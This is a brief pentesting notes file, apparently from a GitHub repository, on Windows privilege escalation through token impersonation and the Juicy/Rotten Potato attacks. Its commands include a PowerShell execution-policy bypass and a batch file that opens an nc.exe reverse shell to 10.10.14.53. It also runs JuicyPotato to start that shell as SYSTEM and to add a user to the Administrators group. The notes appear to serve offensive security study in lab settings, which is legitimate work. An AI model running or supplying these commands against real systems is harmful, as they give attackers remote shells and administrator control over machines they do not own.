# IMPERSONATION ATTACKS

## Token Impersonation
We see which tokens are avaliable to impersonate y get the access into the account of that person

![imagen](https://github.com/D1ie3z/Pentesting/assets/88562299/ced17c45-f8d3-4f6d-adbb-646cd741d18b)

We run mimikatz

## Impersonation overview

* whoami /priv

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges

## Potato Attacks
https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
https://github.com/ohpe/juicy-potato

We need a vali CLSID and Port Number
https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1
powershell -executionpolicy bypass -file GetCLSID.ps1 > clsid.txt
Also Try
* Create a file .bat with reverse shell content -> echo C:\Temp\nc.exe -e cmd.exe 10.10.14.53 443 > Reverse.bat
* Execute with Juicy -> JuicyPotato.exe -t * -p C:\Temp\Reverse.bat -c {CLSID} -l 443 (Try with out CLSID in case doesn't work)
Other option 
* JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Admnistrators Test /add" -l 1234
